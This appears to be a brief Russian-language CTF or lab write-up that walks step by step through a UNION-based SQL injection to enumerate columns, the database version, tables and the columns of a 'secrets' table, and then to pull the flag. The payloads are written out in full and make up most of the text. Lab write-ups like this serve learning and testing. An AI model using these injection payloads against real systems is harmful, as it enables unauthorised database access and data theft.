С помощью UNION SELECT ALL NULL проверяем количество колонок ( при вводе UNION SELECT ALL NULL,NULL,NULL,NULL -- появляется ошибка) => 5 колонки

![](../../attachment/Pasted%20image%2020250421143133.png)

С помощью запроса определим версию базы '1+'+UNION+SELECT+ALL+NULL,VERSION(),NULL,NULL,NULL-- 

![](../../attachment/Pasted%20image%2020250421143323.png)

Выводим таблицы '1+'+UNION+SELECT+ALL+NULL,string_agg(table_name,','),NULL,NULL,NULL+FROM+information_schema.tables--

![](../../attachment/Pasted%20image%2020250421143535.png)

Выводим колонки таблицы secrets '1+'+UNION+SELECT+ALL+NULL,string_agg(column_name,','),NULL,NULL,NULL+FROM+information_schema.columns+WHERE+table_name='secrets'--

![](../../attachment/Pasted%20image%2020250421143706.png)

Выводим флаг
![](../../attachment/Pasted%20image%2020250421144545.png)